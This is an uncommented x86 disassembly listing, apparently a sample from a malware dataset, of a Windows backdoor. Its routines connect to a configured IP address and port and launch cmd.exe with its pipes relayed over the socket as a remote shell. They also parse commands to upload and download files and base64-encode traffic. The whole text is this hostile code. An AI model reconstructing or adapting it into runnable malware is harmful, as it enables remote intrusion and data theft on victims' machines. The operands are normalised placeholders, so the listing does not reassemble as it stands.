sub_401000
push ecx
push ebx
push esi
mov esi [ esp + 0x14 ]
mov ecx 0x3
mov eax esi
xor ebx ebx
cdq
idiv ecx
cmp edx ebx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov eax esi
jmp r-xdata
cmp edx 0x2
lea eax [ esi + 0x1 ]
je r-xdata
lea eax [ esi + 0x2 ]
jmp r-xdata
lea ecx [ eax * 4 ]
mov eax 0x55555556
imul ecx
mov ecx [ esp + 0x1c ]
mov eax edx
shr eax 0x1f
add edx eax
dec ecx
cmp ecx edx
jge r-xdata
mov eax [ esp + 0x8 ]
push ebp
lea edx [ esi + 0x1 ]
push edi
push edx
mov [ esp + 0x14 ] esi
mov [ esp + 0x28 ] ebx
call ??2@YAPAXI@Z
mov ecx esi
mov esi [ esp + 0x1c ]
mov ebp eax
mov eax ecx
mov edi ebp
add esp 0x4
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
cmp ecx 0x3
mov [ ecx + ebp ] 0x0
jl r-xdata
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esp + 0x10 ]
cmp eax 0x2
jne r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea eax [ edx + edx * 2 ]
sub ecx eax
mov [ esp + 0x10 ] ecx
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x24 ]
mov cl [ eax + ebp ]
lea edi [ eax + ebp + 0x1 ]
sar ecx 0x2
and ecx 0x3f
mov dl [ ecx + rw-data ]
mov [ ebx + esi ] dl
mov al [ eax + ebp ]
mov cl [ edi ]
and eax 0x3
sar ecx 0x4
shl eax 0x4
and ecx 0xf
or eax ecx
mov dl [ eax + rw-data ]
mov [ ebx + esi + 0x1 ] dl
mov al [ edi ]
and eax 0xf
mov cl [ eax * 4 + rw-data ]
mov [ ebx + esi + 0x2 ] cl
mov [ ebx + esi + 0x3 ] 0x3d
jmp r-xdata
mov edi [ esp + 0x24 ]
add ebx 0x4
mov cl [ edi + ebp ]
add edi 0x3
sar ecx 0x2
and ecx 0x3f
mov [ esp + 0x24 ] edi
mov al [ ecx + rw-data ]
mov [ esi + ebx - 0x4 ] al
mov cl [ edi + ebp - 0x3 ]
mov al [ edi + ebp - 0x2 ]
and ecx 0x3
sar eax 0x4
shl ecx 0x4
and eax 0xf
or ecx eax
mov cl [ ecx + rw-data ]
mov [ esi + ebx - 0x3 ] cl
mov al [ edi + ebp - 0x1 ]
mov cl [ edi + ebp - 0x2 ]
sar eax 0x6
and ecx 0xf
and eax 0x3
shl ecx 0x2
or eax ecx
mov al [ eax + rw-data ]
mov [ esi + ebx - 0x2 ] al
mov cl [ edi + ebp - 0x1 ]
and ecx 0x3f
dec edx
mov al [ ecx + rw-data ]
mov [ esi + ebx - 0x1 ] al
jne r-xdata
push ebp
mov [ ebx + esi ] 0x0
call ??3@YAXPAX@Z
add esp 0x4
mov eax ebx
pop edi
pop ebp
pop esi
pop ebx
pop ecx
retn
mov eax [ esp + 0x24 ]
mov dl [ eax + ebp ]
sar edx 0x2
and edx 0x3f
mov cl [ edx + rw-data ]
mov [ ebx + esi ] cl
mov dl [ eax + ebp ]
and edx 0x3
shl edx 0x4
mov al [ edx + rw-data ]
mov [ ebx + esi + 0x1 ] al
mov al 0x3d
mov [ ebx + esi + 0x2 ] al
mov [ ebx + esi + 0x3 ] al
add ebx 0x4
sub_4011d0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
mov eax edi
and eax 0x80000003
jns r-xdata
je r-xdata
dec eax
or eax 0xfffffffc
inc eax
push rw-data
push esi
xor ebx ebx
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
push 0x3d
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ebx 0x2
jmp r-xdata
lea eax [ edi + edi * 2 ]
cdq
and edx 0x3
add eax edx
mov ecx eax
mov eax [ esp + 0x18 ]
sar ecx 0x2
sub ecx ebx
cmp eax ecx
jge r-xdata
mov ebx 0x1
sub edi ebx
push ebp
mov [ esp + 0x14 ] edi
push eax
xor edi edi
xor ebx ebx
call ??2@YAPAXI@Z
mov ebp eax
mov eax [ esp + 0x18 ]
add esp 0x4
cmp eax 0x4
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp eax 0x3
jne r-xdata
mov ecx eax
shr ecx 0x2
mov [ esp + 0x1c ] ecx
neg ecx
lea edx [ eax + ecx * 4 ]
mov [ esp + 0x14 ] edx
cmp eax 0x2
jne r-xdata
movsx eax [ edi + esi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ edi + esi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov dl [ ebx + ebp ]
sub eax rw-data
mov ecx eax
sar ecx 0x4
or dl cl
shl al 0x4
mov [ ebx + ebp ] dl
mov [ ebx + ebp + 0x1 ] al
movsx edx [ edi + esi + 0x2 ]
push edx
push rw-data
call [ strchr@IAT ]
mov cl [ ebx + ebp + 0x1 ]
sub eax rw-data
sar eax 0x2
or cl al
add esp 0x18
mov [ ebx + ebp + 0x1 ] cl
add ebx 0x2
jmp r-xdata
movsx eax [ esi + edi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ esi + edi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov dl [ ebx + ebp ]
sub eax rw-data
mov ecx eax
sar ecx 0x4
or dl cl
shl al 0x4
mov [ ebx + ebp ] dl
mov [ ebx + ebp + 0x1 ] al
movsx edx [ esi + edi + 0x2 ]
push edx
push rw-data
call [ strchr@IAT ]
mov dl [ ebx + ebp + 0x1 ]
sub eax rw-data
mov ecx eax
sar ecx 0x2
or dl cl
shl al 0x6
mov [ ebx + ebp + 0x1 ] dl
mov [ ebx + ebp + 0x2 ] al
movsx edx [ esi + edi + 0x3 ]
push edx
push rw-data
call [ strchr@IAT ]
mov cl [ ebx + ebp + 0x2 ]
sub eax rw-data
or cl al
mov eax [ esp + 0x3c ]
mov [ ebx + ebp + 0x2 ] cl
add esp 0x20
add edi 0x4
add ebx 0x3
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov ecx ebx
mov eax ecx
mov esi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebp
and ecx 0x3
[ edi ] [ esi ]
call ??3@YAXPAX@Z
add esp 0x4
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
movsx eax [ edi + esi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ edi + esi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov cl [ ebx + ebp ]
sub eax rw-data
sar eax 0x4
or cl al
add esp 0x10
mov [ ebx + ebp ] cl
inc ebx
sub_401410
sub esp 0x2b0
mov eax [ rw-data ]
mov cx [ rw-data ]
mov dl [ rw-data ]
push ebx
push ebp
push esi
mov esi [ esp + 0x2c0 ]
push edi
push esi
mov [ esp + 0x14 ] 0x2800
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] cx
mov [ esp + 0x1e ] dl
mov [ esp + 0x20 ] 0x2
call inet_addr
add esi 0x104
push esi
mov [ esp + 0x24 ] eax
call [ atoi@IAT ]
add esp 0x4
push eax
call htons
xor esi esi
mov [ esp + 0x1e ] ax
mov [ rw-data ] esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2b0
retn 0x4
push 0x6
push 0x1
push 0x2
call socket
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
call WSACleanup
lea ecx [ esp + 0x10 ]
push 0x4
push ecx
push 0x1001
push 0xffff
push ebp
call setsockopt
lea edx [ esp + 0x10 ]
push 0x4
push edx
push 0x1002
push 0xffff
push ebp
call setsockopt
xor ebx ebx
mov [ rw-data ] 0x1
lea eax [ esp + 0x1c ]
push 0x10
push eax
push ebp
call connect
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2b0
retn 0x4
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x2c ]
push esi
[ edi ]
lea ecx [ esp + 0x30 ]
push 0x104
push ecx
push ebp
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_402830
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
push 0x1f018
inc ebx
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
push eax
push 0x1f018
jmp r-xdata
lea esi [ esp + 0x14 ]
lea eax [ esp + 0x2c ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp ebx 0x3
jge r-xdata
lea eax [ esp + 0x130 ]
mov [ rw-data ] esi
push eax
push 0x202
call WSAStartup
test eax eax
jne r-xdata
call [ Sleep@IAT ]
cmp [ rw-data ] esi
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp ebx 0x3
jl r-xdata
xor esi esi
push ebp
call sub_401610
add esp 0x4
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push 0x2
push ebp
call shutdown
push ebp
call closesocket
call WSACleanup
cmp [ rw-data ] esi
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_401610
sub esp 0x284
push esi
lea eax [ esp + 0x34 ]
xor esi esi
push eax
mov [ esp + 0x8 ] esi
mov [ esp + 0x10 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0xc ] esi
mov [ esp + 0x1c ] 0xc
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x38 ] 0x44
call [ GetStartupInfoA@IAT ]
lea ecx [ esp + 0x88 ]
push 0x100
push ecx
mov [ esp + 0x6c ] si
mov [ esp + 0x68 ] 0x101
call [ GetSystemDirectoryA@IAT ]
push 0x65
push 0x78
push 0x65
push 0x2e
push 0x64
push 0x6d
lea edx [ esp + 0xa0 ]
push 0x63
push edx
lea eax [ esp + 0x1a8 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x28
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0x18 ]
push esi
push ecx
lea edx [ esp + 0x14 ]
lea ecx [ esp + 0xc ]
push edx
push ecx
mov [ rw-data ] eax
call eax
lea edx [ esp + 0x18 ]
push esi
lea eax [ esp + 0xc ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
call [ rw-data ]
mov eax [ esp + 0xc ]
mov edx [ esp + 0x14 ]
mov [ esp + 0x74 ] eax
mov [ esp + 0x70 ] eax
lea eax [ esp + 0x78 ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
push esi
push esi
push esi
push 0x1
mov [ esp + 0x84 ] edx
push esi
push esi
lea edx [ esp + 0x1a8 ]
push rw-data
push edx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x28c ]
push ebx
mov ebx [ CreateThread@IAT ]
push edi
mov [ esp + 0x30 ] ecx
push esi
lea ecx [ esp + 0x30 ]
lea eax [ esp + 0x10 ]
push esi
push ecx
mov [ esp + 0x38 ] eax
push sub_4017c0
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x2a4 ]
push esi
push esi
mov [ esp + 0x4c ] edx
mov [ esp + 0x50 ] eax
mov [ esp + 0x30 ] esi
call ebx
push esi
lea edx [ esp + 0x38 ]
push esi
push edx
push sub_401ae0
push esi
push esi
mov edi eax
call ebx
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
lea eax [ esp + 0x18 ]
push eax
push edi
call [ GetExitCodeThread@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
push edi
call [ TerminateThread@IAT ]
push 0x3e8
call [ Sleep@IAT ]
pop edi
pop ebx
mov eax 0x1
pop esi
add esp 0x284
retn
mov [ rw-data ] 0x1
pop esi
add esp 0x284
retn
sub_4017c0
sub esp 0x260
push ebp
mov ebp [ PeekNamedPipe@IAT ]
push esi
mov esi [ esp + 0x26c ]
push edi
mov edi [ Sleep@IAT ]
push 0x1
call edi
mov edx [ esi ]
push 0x0
lea eax [ esp + 0x10 ]
push 0x0
push eax
mov eax [ edx ]
lea ecx [ esp + 0x1c ]
push 0x258
push ecx
push eax
call ebp
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push 0x0
push ecx
push eax
mov eax [ esi ]
lea edx [ esp + 0x1c ]
push edx
mov ecx [ eax ]
push ecx
call [ ReadFile@IAT ]
push 0x0
lea edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push eax
push edx
mov [ esp + eax + 0x1c ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push ecx
call sub_4029d0
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
mov [ rw-data ] 0x1
xor eax eax
pop ebp
add esp 0x260
retn 0x4
sub_401860
sub esp 0x4d0
push ebx
push ebp
push esi
lea eax [ esp + 0x24 ]
push edi
xor ebx ebx
push eax
mov [ esp + 0x20 ] 0xc
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x2c ] 0x44
call [ GetStartupInfoA@IAT ]
lea ecx [ esp + 0x1c ]
push ebx
lea edx [ esp + 0x14 ]
push ecx
lea eax [ esp + 0x1c ]
push edx
push eax
mov [ esp + 0x68 ] bx
mov [ esp + 0x64 ] 0x101
mov [ esp + 0x24 ] ebx
mov [ esp + 0x20 ] ebx
call [ CreatePipe@IAT ]
lea ecx [ esp + 0x180 ]
push 0x104
mov eax [ esp + 0x14 ]
push ecx
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] eax
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x180 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
mov ebp [ esp + 0x4e4 ]
and ecx 0x3
lea edx [ esp + 0x180 ]
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x6c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x184 ]
push ecx
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
push edx
push ebx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
mov edx [ ebp + 0x130 ]
[ edi ]
mov eax [ edx ]
push ebx
not ecx
dec ecx
push ecx
push ebp
push eax
call sub_4029d0
mov esi [ Sleep@IAT ]
add esp 0x10
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x80 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea edi [ esp + 0x88 ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebp + 0x130 ]
[ edi ]
mov eax [ edx ]
push ebx
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x90 ]
push ecx
push eax
call sub_4029d0
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4d0
retn 0x4
mov edx [ esp + 0x14 ]
push edx
call [ CloseHandle@IAT ]
lea eax [ esp + 0x7d ]
mov [ esp + 0x7c ] 0xa
push eax
push 0x103
call [ GetCurrentDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x7c ]
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x80 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x80 ]
push ecx
mov ecx [ ebp + 0x130 ]
push eax
mov edx [ ecx ]
push edx
call sub_4029d0
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4d0
retn 0x4
mov ecx [ esp + 0x18 ]
lea edi [ esp + 0x284 ]
xor eax eax
push ebx
mov [ esp + ecx + 0x288 ] bl
or ecx 0xffffffff
[ edi ]
mov eax [ ebp + 0x130 ]
lea edx [ esp + 0x288 ]
not ecx
dec ecx
push ecx
mov ecx [ eax ]
push edx
push ecx
call sub_4029d0
add esp 0x10
push 0x64
call esi
jmp r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push ebx
push ecx
lea edx [ esp + 0x28c ]
push 0x258
push edx
push eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub_401ae0
sub esp 0x674
push ebx
push ebp
mov ebp [ esp + 0x680 ]
mov ebx [ CreateThread@IAT ]
push esi
push edi
mov ecx 0x4d
xor eax eax
lea edi [ esp + 0x244 ]
[ edi ]
mov eax [ ebp + 0x4 ]
mov [ esp + 0x374 ] eax
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x1
xor eax eax
pop ebx
add esp 0x674
retn 0x4
lea edi [ esp + 0x14 ]
mov [ esp + esi + 0x14 ] 0x0
dec edi
mov al [ edi + esi ]
cmp al 0xd
je r-xdata
push 0x3
lea edx [ esp + 0x18 ]
mov [ edi + esi ] 0x0
mov esi [ strncmp@IAT ]
push rw-data
push edx
call esi
add esp 0xc
test eax eax
jne r-xdata
cmp al 0xa
je r-xdata
push 0x3
lea edx [ esp + 0x18 ]
push rw-data
push edx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea edi [ esp + 0x17 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x580 ]
mov eax ecx
mov esi edi
mov edi edx
push 0x8
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ malloc@IAT ]
mov esi eax
add esp 0x4
mov edx esi
xor ecx ecx
push 0x0
push 0x0
mov [ edx ] ecx
push esi
push sub_401f70
push 0x0
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x4 ]
lea ecx [ esp + 0x594 ]
push 0x0
mov [ esi ] eax
mov [ esi + 0x4 ] ecx
call ebx
mov edi eax
push 0xffffffff
push edi
call [ WaitForSingleObject@IAT ]
push 0x0
push edi
call [ TerminateThread@IAT ]
push esi
call [ free@IAT ]
add esp 0x4
jmp r-xdata
mov eax [ ebp + 0x4 ]
mov ecx 0x12c
sub ecx esi
push 0x0
push ecx
mov ecx [ eax ]
lea edx [ esp + esi + 0x1c ]
push edx
push ecx
call sub_402830
add esp 0x10
cmp eax 0xffffffff
je r-xdata
push 0x5
lea edx [ esp + 0x18 ]
push rw-data
push edx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea edi [ esp + 0x17 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x378 ]
mov eax ecx
mov esi edi
mov edi edx
push 0x8
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call [ malloc@IAT ]
mov esi eax
add esp 0x4
mov edx esi
xor ecx ecx
push 0x0
push 0x0
mov [ edx ] ecx
push esi
push sub_402180
push 0x0
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x4 ]
lea ecx [ esp + 0x38c ]
push 0x0
mov [ esi ] eax
mov [ esi + 0x4 ] ecx
call ebx
mov edi eax
push 0xffffffff
push edi
call [ WaitForSingleObject@IAT ]
push 0x0
push edi
call [ TerminateThread@IAT ]
push esi
call [ free@IAT ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x4 ]
mov ecx 0x4b
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
mov [ esp + 0x10 ] eax
push eax
mov eax [ edx ]
lea ecx [ esp + 0x18 ]
push 0x12c
push ecx
push eax
call sub_402830
mov esi eax
add esp 0x10
cmp esi 0xffffffff
je r-xdata
add esi eax
mov al [ edi + esi ]
cmp al 0xd
jne r-xdata
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x140 ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x14c ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
mov eax [ ebp + 0x4 ]
lea edx [ esp + 0x150 ]
not ecx
dec ecx
push ecx
mov ecx [ eax ]
push edx
push ecx
call sub_4029d0
mov esi [ sscanf@IAT ]
add esp 0x1c
lea edx [ esp + 0x47c ]
lea eax [ esp + 0x14 ]
push edx
push rw-data
push eax
call esi
add esp 0xc
lea ecx [ esp + 0x378 ]
lea edi [ esp + 0x47c ]
xor eax eax
push ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push rw-data
lea edx [ esp + ecx + 0x1d ]
push edx
call esi
lea eax [ esp + 0x384 ]
lea ecx [ esp + 0x488 ]
push eax
push ecx
call sub_402370
add esp 0x14
test eax eax
jne r-xdata
mov edx [ ebp ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
mov eax [ edx ]
push 0x5
push rw-data
push eax
call [ WriteFile@IAT ]
pop edi
mov eax 0x1
pop esi
pop ebp
mov [ rw-data ] eax
pop ebx
add esp 0x674
retn 0x4
push 0x5
lea edx [ esp + 0x18 ]
push rw-data
push edx
call esi
add esp 0xc
test eax eax
jne r-xdata
push eax
lea eax [ esp + 0x144 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea edx [ esp + 0x140 ]
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x8
jmp r-xdata
cmp [ esp + 0x14 ] 0x21
jne r-xdata
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx 0x5
ja r-xdata
lea edi [ esp + 0x140 ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebp + 0x4 ]
[ edi ]
mov eax [ edx ]
push 0x0
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x148 ]
push ecx
push eax
call sub_4029d0
mov edx [ ebp ]
add esp 0x10
lea ecx [ esp + 0x10 ]
mov eax [ edx ]
push 0x0
push ecx
push 0x1
push rw-data
push eax
call [ WriteFile@IAT ]
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebp ]
[ edi ]
mov eax [ edx ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x20 ]
push ecx
push eax
call [ WriteFile@IAT ]
jmp r-xdata
mov ecx 0x4b
xor eax eax
lea edi [ esp + 0x244 ]
lea edx [ esp + 0x244 ]
[ edi ]
stosb [ edi ]
lea edi [ esp + 0x15 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x24c ]
push ecx
push sub_401860
push 0x0
push 0x0
call ebx
jmp r-xdata
mov edx [ ebp ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
mov eax [ edx ]
push 0x5
push rw-data
push eax
call [ WriteFile@IAT ]
push rw-data
lea ecx [ esp + 0x1d ]
push rw-data
push ecx
call [ sscanf@IAT ]
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x674
retn 0x4
sub_401f70
sub esp 0x4b8
push ebp
mov ebp [ esp + 0x4c0 ]
push esi
push edi
mov eax [ ebp + 0x4 ]
push 0x8000
push eax
call [ _open@IAT ]
mov esi eax
add esp 0x8
cmp esi 0xffffffff
mov [ esp + 0xc ] esi
jne r-xdata
push ebx
push esi
call [ _filelength@IAT ]
mov edx eax
mov ecx 0x96
xor eax eax
lea edi [ esp + 0x1c ]
add esp 0x4
mov [ esp + 0x14 ] edx
[ edi ]
push edx
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
mov eax [ ebp ]
lea edx [ esp + 0x28 ]
not ecx
dec ecx
push ecx
mov ecx [ eax ]
push edx
push ecx
call sub_4029d0
mov ecx 0x96
xor eax eax
lea edi [ esp + 0x28c ]
push eax
[ edi ]
mov eax [ ebp ]
lea edx [ esp + 0x290 ]
push 0x258
push edx
mov ecx [ eax ]
push ecx
call sub_402830
lea edx [ esp + 0x29c ]
push edx
call [ atoi@IAT ]
mov ebx eax
push 0x1
push ebx
push esi
call [ _lseek@IAT ]
mov eax [ esp + 0x50 ]
add esp 0x3c
cmp ebx eax
je r-xdata
mov ecx 0x96
xor eax eax
lea edi [ esp + 0x14 ]
lea edx [ esp + 0x14 ]
[ edi ]
mov edi rw-data
or ecx esi
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
mov edx [ ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
[ edi ]
mov eax [ edx ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x1c ]
push ecx
push eax
call sub_4029d0
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebp
add esp 0x4b8
retn 0x4
push esi
call [ _close@IAT ]
add esp 0x4
xor eax eax
pop ebx
pop edi
pop esi
pop ebp
add esp 0x4b8
retn 0x4
jmp r-xdata
mov ecx 0x96
xor eax eax
lea edi [ esp + 0x18 ]
push 0x258
[ edi ]
lea eax [ esp + 0x1c ]
push eax
push esi
call [ _read@IAT ]
mov edx [ ebp ]
push 0x0
push eax
lea ecx [ esp + 0x2c ]
mov eax [ edx ]
push ecx
push eax
call sub_4029d0
add esp 0x1c
cmp eax 0xffffffff
je r-xdata
mov edx [ ebp ]
add ebx eax
mov ecx 0x96
xor eax eax
lea edi [ esp + 0x270 ]
push eax
[ edi ]
mov eax [ edx ]
lea ecx [ esp + 0x274 ]
push 0x258
push ecx
push eax
call sub_402830
add esp 0x10
mov esi rw-data
lea eax [ esp + 0x270 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi [ esp + 0x10 ]
push 0x1
call [ Sleep@IAT ]
cmp ebx [ esp + 0x14 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov esi [ esp + 0x10 ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_402180
sub esp 0x38c
push ebp
mov ebp [ esp + 0x394 ]
push edi
push 0x80
mov eax [ ebp + 0x4 ]
push 0x8101
push eax
call [ _open@IAT ]
add esp 0xc
cmp eax 0xffffffff
mov [ esp + 0xc ] eax
jne r-xdata
push ebx
push esi
push eax
call [ _filelength@IAT ]
add esp 0x4
mov ebx eax
mov ecx 0x96
xor eax eax
lea edi [ esp + 0x144 ]
push ebx
lea edx [ esp + 0x148 ]
push rw-data
[ edi ]
push edx
call [ sprintf@IAT ]
lea edi [ esp + 0x150 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x154 ]
push ecx
mov ecx [ ebp ]
push eax
mov edx [ ecx ]
push edx
call sub_4029d0
mov ecx 0x4b
xor eax eax
lea edi [ esp + 0x34 ]
push eax
[ edi ]
mov ecx [ ebp ]
lea eax [ esp + 0x38 ]
push 0x12c
push eax
mov edx [ ecx ]
push edx
call sub_402830
lea eax [ esp + 0x44 ]
push eax
call [ atoi@IAT ]
mov [ esp + 0x40 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x174 ]
mov eax ecx
mov esi edi
mov edi edx
mov edx [ ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push 0x0
[ edi ] [ esi ]
lea edi [ esp + 0x178 ]
